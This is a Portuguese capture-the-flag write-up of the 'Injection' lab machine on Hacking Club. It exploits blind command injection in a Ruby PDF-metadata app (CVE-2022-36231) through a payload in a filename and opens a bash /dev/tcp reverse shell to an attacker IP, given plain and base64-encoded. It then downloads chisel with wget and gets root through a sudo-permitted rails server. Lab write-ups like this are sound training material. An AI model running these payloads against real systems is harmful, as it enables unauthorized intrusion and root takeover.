@@ -1,0 +1,149 @@
+---
+title: 'Injection Writeup'
+date: '2024-11-25'
+tags: ['CVE-2022-36231', 'Command Injection', 'Linux']
+draft: false
+summary: 'A máquina Injection é vulnerável a Command Injection (CVE-2022-36231) e escalonamento de privilégios via sudo.'
+images: ['/static/images/injection-writeup-images/default.png']
+authors: ['default']
+---
+
+![logo](/static/images/injection-writeup-images/default.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Easy
+
+### **Nome**: Injection
+
+---
+
+## **Port Scanning**
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```bash
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 12:68:ac:62:e8:c0:bf:55:25:85:06:96:4b:99:bb:4a (ECDSA)
+|_  256 65:dc:ed:09:75:7b:d2:d9:a0:19:e5:1c:e7:1d:14:53 (ED25519)
+3000/tcp open  ppp?
+| fingerprint-strings:
+|   GenericLines, Help, NCP:
+|     HTTP/1.1 400 Bad Request
+|   GetRequest:
+|     HTTP/1.0 200 OK
+|     X-Frame-Options: SAMEORIGIN
+|     X-XSS-Protection: 0
+|     X-Content-Type-Options: nosniff
+|     X-Download-Options: noopen
+|     X-Permitted-Cross-Domain-Policies: none
+
+```
+
+Somente as portas 22 (SSH) e 3000 (HTTP) estão abertas.
+
+---
+
+## Enumeration
+
+`http://172.16.4.120:3000`
+
+Se trata de uma aplicação chamada **PDFInfo**, uma aplicação capaz de ler metadados de PDFs.
+
+![injection](/static/images/injection-writeup-images/image.png)
+
+Quando enviamos um PDF, podemos ver que a aplicação é desenvolvida em ruby:
+
+![injection 1](/static/images/injection-writeup-images/image1.png)
+
+Com isso, se pesquisarmos por **pdfinfo ruby exploit**, vemos existem CVEs associadas.
+
+[https://github.com/affix/CVE-2022-36231](https://github.com/affix/CVE-2022-36231)
+
+![injection 2](/static/images/injection-writeup-images/image2.png)
+
+Nesse caso em especifico, temos a vulnerabilidade de **Command Injection.**
+
+Testei o comando `id` , mas não obtive sucesso, o que indica ser um **Command Injection Blind**.
+
+Passando o comando `sleep 5` , vemos que a aplicação demora pra retornar o resultado.
+
+`;$(sleep 5).pdf`
+
+![injection 3](/static/images/injection-writeup-images/image3.png)
+
+---
+
+## Foot Hold
+
+Tentando passar a reverse shell do modo tradicional não funciona, então a alternativa foi encodar a payload em base64 antes de mandar.
+
+`echo "bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1234 <&1'" | base64`
+
+`echo -n YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMC4zMS4xNTAvMTMzNyA8JjEnCg== |base64 -d|sh`
+
+![injection 4](/static/images/injection-writeup-images/image4.png)
+
+---
+
+## Privillege Escalation
+
+Conseguimos executar o comando `/usr/local/bin/rails server -e development -p 8000` como root.
+
+`sudo -l`
+
+![injection 5](/static/images/injection-writeup-images/image5.png)
+
+`rm /home/deployer/pdf-read-metadata/tmp/pids/server.pid`
+
+`sudo /usr/local/bin/rails server -e development -p 8000`
+
+![injection 6](/static/images/injection-writeup-images/image6.png)
+
+Agora como podemos iniciar a aplicação como root, precisamos fazer um _Port Fowarding_ pra acessar a aplicação da nossa maquina.
+
+O servidor tem o servidor SSH configurado e acessível que podemos utilizar, mas dessa vez utilizei a ferramenta `chisel` .
+
+[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+
+Para realizar o _Port Fowarding_, precisamos transferir o `chisel` pra maquina alvo.
+
+`python -m http.server 80`
+
+![injection 7](/static/images/injection-writeup-images/image7.png)
+
+`wget http://10.0.31.150/chisel`
+
+![injection 8](/static/images/injection-writeup-images/image8.png)
+
+Após isso, na nossa maquina vamos ligar o servidor do chisel.
+
+`./chisel server -p 9000 --reverse`
+
+![injection 9](/static/images/injection-writeup-images/image9.png)
+
+Agora na maquina alvo, vamos fazer o _Port Fowarding_.
+
+OBS: utilizei duas shells para conseguir realizar.
+
+`sudo /usr/local/bin/rails server -e development -p 8000` #no diretório `/pdf-read-metadata`
+
+`./chisel client 10.0.31.150:9000 R:8000:127.0.0.1:8000` #no diretório `/tmp`
+
+![injection 10](/static/images/injection-writeup-images/image10.png)
+
+Com isso, podemos acessar a aplicação da nossa maquina.
+
+![injection 11](/static/images/injection-writeup-images/image11.png)
+
+Agora é só pegar a reverse-shell da mesma maneira utilizada na primeira vez, no entanto, agora vamos entrar como root.
+
+![injection 12](/static/images/injection-writeup-images/image12.png)
+
+---
+
+## Proof
+
+![injection 13](/static/images/injection-writeup-images/image13.png)
